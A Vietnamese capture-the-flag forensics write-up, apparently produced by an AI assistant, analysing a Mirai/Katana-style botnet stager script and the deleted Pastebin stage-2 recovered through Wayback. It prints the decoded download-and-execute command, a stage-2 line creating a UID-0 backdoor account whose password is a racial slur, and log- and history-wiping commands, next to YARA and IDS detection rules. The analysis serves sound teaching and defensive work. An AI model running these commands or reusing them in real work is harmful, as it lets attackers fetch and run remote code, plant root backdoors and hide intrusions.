@@ -1,1 +1,157 @@
+Write-up — Phân tích Forensics: Katana / Mirai-like payload (payload.py)
+Tóm tắt kết quả
+•	Flag / IoC tìm được: CHH{Mirai_aka_Katana_b0tn3t} (xuất hiện trong payload stage-2 được lưu trên Pastebin — được Wayback khôi phục).
+•	Kết luận chính: file payload.py là builder / stager; địa chỉ C2 không được hardcode mà được lấy động bằng http://api.ipify.org. Payload thực tế (stage-2) được lưu trên Pastebin (Zym8pVcz) — trong đó chứa lệnh tạo backdoor và URL có flag.
+Mục tiêu tài liệu
+1.	Giải thích chi tiết cấu trúc và hành vi của payload.py (dòng — dòng), kèm tư duy phân tích.
+2.	Trình diễn các bước forensic an toàn đã thực hiện để tìm C2 / flag.
+3.	Giải thích khái niệm botnet, cơ chế hoạt động, và lý do attacker dùng kỹ thuật như trong dropper.
+4.	Đề xuất checklist phân tích, các lệnh an toàn để dùng, và gợi ý phát hiện/giảm thiểu.
+1) Nội dung tệp payload.py (tóm tắt)
+Đoạn mã chính (rút gọn) chứa các phần:
+import subprocess, sys, urllib, time, base64, subprocess
+ip = urllib.urlopen('http://api.ipify.org').read()
+exec_bin = "yakuza"
+exec_name = "wget.ssh"
+bin_prefix = ""
+bin_directory = "vi"
+archs = ["x86.yakuza", "mips.yakuza", ... ]
+# nhiều lệnh run(...) để tạo các shell scripts (yakuza.sh, tyakuza.sh, ...)
+encoded = "Y2QgL3RtcDsg..."
+exploit = str(base64.b64decode(encoded))
+exploitmake(exploit)
+# loop ghi các lệnh wget/curl/ftpget/tftp cho từng arch
+complete_payload = ("cd /tmp || ... wget http://" + ip + "/yakuza.sh; ...")
+f = open("payload.txt","w+")
+f.write(complete_payload)
+Ý chính: đây là một builder/stager — không phải binary bot chính. Khi attacker chạy script này trên server của họ, nó sẽ tự sinh payload.txt (và nhiều shell script) với IP public của server attacker (lấy từ api.ipify.org).
+2) Phân tích chi tiết (dòng — dòng) và tư duy
+Mình phân tích theo nhóm logic để dễ theo dõi.
+A. Imports & biến khởi tạo
+import subprocess, sys, urllib, time, base64, subprocess
+•	subprocess: dùng để gọi lệnh shell (subprocess.call(..., shell=True)).
+•	urllib: dùng để thực hiện HTTP GET (ở đây urllib.urlopen('http://api.ipify.org')).
+•	base64: dùng để giải mã chuỗi base64 (thường dùng để che dấu command/URL).
+•	time: dùng cho sleep/delay (ở đây time.sleep(3) nhiều chỗ) — mục đích có thể để chờ các service khởi chạy.
+Tư duy: khi thấy subprocess + urllib + base64 trong script lạ, khả năng cao là loader (download & exec) — cần đặc biệt cảnh giác, không chạy.
+B. Lấy IP động: api.ipify.org
+ip = urllib.urlopen('http://api.ipify.org').read()
+•	api.ipify.org trả về IP public hiện tại của host gọi đến (ví dụ: 203.0.113.45).
+•	Do đó ip ở đây không phải hằng số mà là giá trị động tùy nơi attacker chạy script.
+Tại sao attacker làm vậy? - Kỹ thuật này dùng khi attacker muốn tạo payload tùy theo IP lúc build — ví dụ attacker chạy script trên server X; payload được ghi wget http://<IP-of-X>/yakuza.sh → các máy bị nhiễm sẽ tải từ server X. (Nói cách khác: script chuyển biến builder thành một công cụ “điền IP tự động”.) - Lợi ích: không phải sửa tay IP mỗi lần; nếu muốn thay đổi C2 thì chỉ cần chạy lại trên server mới.
+Hậu quả forensic: - Nếu chỉ có payload.py mà không có bản payload.txt do attacker đã xuất ra, ta không thể biết IP C2 thật (vì nó không hardcode).
+C. Danh sách archs và exec_bin
+•	archs = ["x86.yakuza", "mips.yakuza", ...]
+•	exec_bin = "yakuza"; exec_name = "wget.ssh"; bin_directory = "vi"
+Ý đồ attacker: - Đây là payload multi-arch — attacker chuẩn bị binary tương ứng với nhiều kiến trúc (IoT devices: mips, arm, sh4, v.v.) để lây lan rộng. - Script sẽ sinh ra các lệnh wget http://<ip>/vi/x86.yakuza (và curl/ftp/tftp tương tự) để host bị nhiễm thử tải nhiều biến thể tuỳ architecture.
+D. Chuỗi encoded (base64)
+Dòng:
+encoded = "Y2QgL3RtcDsgd2dldCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvelltOHBWY3ogLU8gYSA+IC9kZXYvbnVsbCAyPiYxOy..."
+exploit = str(base64.b64decode(encoded))
+exploitmake(exploit)
+•	Tác dụng: che dấu một command nguy hiểm trong base64 để tránh bị nhìn thấy trực tiếp khi đọc file.
+•	Giải mã ta được (đã làm trong phân tích):
+cd /tmp; wget https://pastebin.com/raw/Zym8pVcz -O a > /dev/null 2>&1; chmod 777 a; sh a > /dev/null 2>&1; rm -rf a; history -c; clear;
+Giải thích: - Tải tiếp một script nhỏ ở Pastebin (Zym8pVcz) — đó mới là stage 2 chứa lệnh thực thi chính (ví dụ: tạo user backdoor, tải binary thực sự, v.v.). - Xóa file sau khi chạy và dọn lịch sử để giảm dấu vết.
+Tư duy forensic: - Khi thấy base64 + sh a, ta phải giải mã base64 (an toàn, offline) chứ không chạy sh. Giải mã sẽ chỉ cho ta URL: Pastebin/Gist/hosting nơi đặt mã thực.
+E. Vòng lặp ghi script cho từng arch
+Trong for i in archs: script thực hiện:
+run('echo "cd /tmp ...; wget http://' + ip + '/'+bin_directory+'/'+i + ' ..." >> /var/www/html/yakuza.sh')
+# tương tự cho ftp/tftp -> /var/ftp/yakuza1.sh, /var/lib/tftpboot/tyakuza.sh
+Ý đồ: sinh ra các shell scripts trên server để cho bot khác (khi chạy) dễ tải binary theo nhiều giao thức (HTTP, FTP, TFTP). Điều này giúp tăng tỷ lệ thành công khi tấn công các thiết bị IoT khác nhau.
+F. complete_payload và payload.txt
+complete_payload = ("cd /tmp || ... wget http://" + ip + "/yakuza.sh; ... rm -rf *")
+f = open("payload.txt","w+")
+f.write(complete_payload)
+•	complete_payload chính là command nhồi vào nạn nhân — đủ các bước tải, chạy, tải thêm qua tftp/ftp, sau đó xóa dấu vết.
+•	payload.txt dùng để lưu chuỗi đó.
+Hậu quả: nếu attacker chạy script trên server thật, payload.txt sẽ chứa IP C2 thật (ví dụ wget http://203.0.113.45/yakuza.sh). Đây chính là IoC quan trọng.
+G. Kết luận phần code
+•	payload.py là builder/stager: mục tiêu là tạo payload có ip của server attacker và scripts để deploy. Script này không chứa binary bot hay IP C2 cứng — thay vào đó nó tải stage-2 từ Pastebin.
+•	Vì vậy forensic cần: (1) tìm stage-2 (Pastebin), hoặc (2) tìm payload.txt được sinh ra, hoặc (3) tìm log/pcap chứa request tới api.ipify.org hay request tới pastebin/cookiearena.org.
+3) Những gì mình làm để lấy flag (quy trình phân tích thực tế)
+Các bước an toàn, chỉ đọc/tải nội dung, không chạy mã.
+1.	Xem archive (nếu file nén):
+ 	tar -tvf payload.tar.gz
+ 	-> biết chỉ có payload.py.
+2.	Tìm chuỗi quan trọng trong payload.py:
+ 	grep -R --line-number -i "yakuza\|payload\|pastebin" .
+ 	-> tìm thấy encoded base64.
+3.	Giải mã base64 (chỉ decode, không thực thi):
+ 	echo "Y2QgL3RtcDsg..." | base64 -d
+ 	-> nhận được lệnh tải https://pastebin.com/raw/Zym8pVcz.
+4.	Thử tải trực tiếp Pastebin (an toàn):
+ 	curl -s https://pastebin.com/raw/Zym8pVcz
+ 	-> trả về rỗng (paste bị xóa).
+5.	Tìm snapshot trên Wayback (Internet Archive):
+ 	curl -s "http://web.archive.org/cdx/search/cdx?url=pastebin.com/raw/Zym8pVcz&output=text&fl=timestamp,original"
+ 	-> thấy snapshot 20230716061911.
+6.	Lấy nội dung snapshot:
+ 	curl -s "http://web.archive.org/web/20230716061911/https://pastebin.com/raw/Zym8pVcz"
+ 	-> nội dung:
+ 	useradd -o -u 0 -g 0 -M -d /root -s /bin/bash bigbots; echo -e "fatnigger123\nfatnigger123" | passwd bigbots; wget -q -O /tmp/... https://cookiearena.org/CHH%7BMirai_aka_Katana_b0tn3t%7D; rm -rf /var/log/lastlog; history -c history -c
+7.	Phân tích output paste: thấy URL chứa flag CHH{Mirai_aka_Katana_b0tn3t} — đó là flag/IoC.
+Ghi chú an toàn: trong toàn bộ quá trình không chạy sh hay wget để tải các file thực thi. Ta chỉ lấy nội dung text để đọc.
+4) Giải thích các câu lệnh độc hại được tìm thấy (tường tận, vì sao nguy hiểm)
+Dưới đây là từng phần của dòng script stage-2 (đã trích từ Wayback). Mình giải thích chứ không khuyến khích dùng.
+Dòng found:
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash bigbots;
+•	useradd tạo user mới tên bigbots.
+•	-o -u 0 gán UID=0 cho user đó → UID 0 = quyền root.
+•	-g 0 gán group root.
+•	-M -d /root không tạo home mà dùng /root làm home.
+•	-s /bin/bash shell login.
+Tại sao nguy hiểm: attacker tạo backdoor account với quyền root — cho phép truy cập shell root bất hợp pháp.
+echo -e "fatnigger123\nfatnigger123" | passwd bigbots;
+•	Đặt mật khẩu fatnigger123 cho user bigbots.
+•	Sau đó attacker có credentials root để login (qua ssh/password brute-force nếu mở).
+Tác động: backdoor sẵn sàng để người khác truy cập.
+wget -q -O /tmp/... https://cookiearena.org/CHH%7BMirai_aka_Katana_b0tn3t%7D;
+•	wget -q -O /tmp/... URL tải nội dung từ cookiearena.org vào file tạm.
+•	Ở chall, URL chứa chính flag (mã URL-encoded CHH{Mirai_aka_Katana_b0tn3t}).
+Tư duy: đây là nơi attacker đặt payload thực thi hoặc ở chall, là nơi BTC để flag.
+rm -rf /var/log/lastlog; history -c history -c
+•	Xóa log lastlog (chứa thông tin login), và xóa lịch sử shell (history -c) để che dấu dấu vết.
+Tác động: làm forensic khó hơn.
+5) Botnet là gì? (giải thích tường tận, dễ hiểu)
+Botnet = network of compromised machines (bot = máy bị nhiễm; net = mạng).
+•	Bot (agent): chương trình độc hại chạy trên máy nạn nhân, làm theo lệnh C2.
+•	C2 (Command & Control): server hoặc cơ chế mà attacker dùng để gửi lệnh/nhận dữ liệu từ bots.
+•	Controller / Attacker: người/nhóm điều khiển botnet.
+Cách hoạt động chung: 1. Lây nhiễm (Infection): exploit / brute-force / social-engineering → ghi payload lên máy nạn nhân. 2. Lập trình agent: agent khởi chạy, cố liên hệ C2 để nhận lệnh hoặc chờ lệnh. 3. C2 giao tiếp: có thể qua HTTP(S), IRC, DNS, P2P, hoặc phụ thuộc vào kỹ thuật mã hóa/obfuscation. 4. Thực thi lệnh: tấn công DDoS, tải mining software, mở backdoor, tấn công tiếp (propagation). 5. Che dấu: xoá log, setuid, rootkit, persist bằng cron/systemd, etc.
+Tại sao dùng Pastebin / api.ipify?: - Pastebin/Gist — dễ cập nhật payload gốc mà không cần rebuild binaries. - api.ipify — tạo C2 động hoặc tự lấy IP khi builder chạy (nhanh, tự động). Attackers dùng các dịch vụ trung gian để tránh hardcoding server và làm cho forensic khó hơn.
+6) IoC (Indicators of Compromise) tìm được
+•	payload.py — stager.
+•	encoded base64 chỉ tới https://pastebin.com/raw/Zym8pVcz (stage-2).
+•	Pastebin stage-2 snapshot chứa: useradd ... bigbots, passwd bigbots, wget ... https://cookiearena.org/CHH{Mirai_aka_Katana_b0tn3t}.
+•	Flag/URL: https://cookiearena.org/CHH{Mirai_aka_Katana_b0tn3t}
+•	Tên binary / exec: yakuza, x86.yakuza, mips.yakuza, … — dùng để lọc file.
+7) Checklist Forensic & các lệnh an toàn (chỉ đọc — không chạy payload)
+Môi trường: luôn phân tích trên VM/sandbox offline, snapshot, không nối mạng hoặc ở mạng phân tách.
+Lệnh đọc / phân tích an toàn: - Liệt kê archive: tar -tvf payload.tar.gz - Tìm chuỗi: grep -R --line-number -i "yakuza\|pastebin\|api.ipify" . - Giải mã base64: echo "<base64>" | base64 -d - Tải nội dung text an toàn: curl -s <url> (chỉ lấy text, không chạy) - Xem file binary tĩnh: file x86.yakuza; strings x86.yakuza | less - PCAP analysis: tshark -r capture.pcap -Y "http.request" -T fields -e ip.dst -e http.host -e http.request.uri - Hashing: sha256sum suspicious.bin để tracking
+Tools hữu ích: strings, file, readelf, rizin/radare2, ghidra (phân tích tĩnh), tshark, suricata, yara, volatility (phân tích memory).
+8) Mẹo phát hiện & signature (defensive)
+Mẫu quy tắc để phát hiện hành vi tương tự (chỉ ví dụ phòng thủ).
+YARA (mẫu đơn giản):
+rule katana_stage1 {
+    strings:
+        $s1 = "api.ipify.org" nocase
+        $s2 = "pastebin.com/raw/" nocase
+        $s3 = "yakuza" nocase
+    condition:
+        any of them
+}
+Suricata/IDS signature (ví dụ): - Detect HTTP request to pastebin.com/raw/ or to suspicious path containing yakuza. - Rule (ý tưởng): alert http any any -> any any (msg:“Possible katana stager pastebin download”; content:“pastebin.com/raw/”; sid:1000001; rev:1;)
+Host-based detection: - Watch for newly created users with UID 0 (/etc/passwd entries with UID 0). - Giám sát /var/log/auth.log, /var/log/lastlog modifications. - Tìm file yakuza / script trong webroot /var/www/html hoặc /var/ftp hoặc /var/lib/tftpboot.
+9) Kết luận ngắn
+•	payload.py không chứa IP C2 cứng; nó lấy IP public động (api.ipify.org) và tải stage-2 từ Pastebin.
+•	Bằng cách dùng Wayback (web.archive.org) để khôi phục paste bị xóa, ta tìm được stage-2 và flag: CHH{Mirai_aka_Katana_b0tn3t}.
+•	Quan trọng: luôn phân tích offline, chỉ đọc, không thực thi payload. Dùng rules & giám sát để phát hiện hành vi tương tự trong hệ thống thật.
+10) Tham khảo & tài nguyên đề xuất để học tiếp
+•	Hacking / Forensics basics: Practical Malware Analysis (book)
+•	Tools: rizin/radare2, ghidra, tshark, volatility, yara, suricata.
+•	Hướng dẫn CTF forensics: các writeup trên CTFtime, Root-Me, TryHackMe (Forensics track).
+
+Nếu cậu muốn, tớ có thể: export bản này thành file .doc/.docx để cậu tải, hoặc tách thành 1 trang tóm tắt ngắn để nộp. Nói tớ biết kiểu nào cậu muốn.
+
 
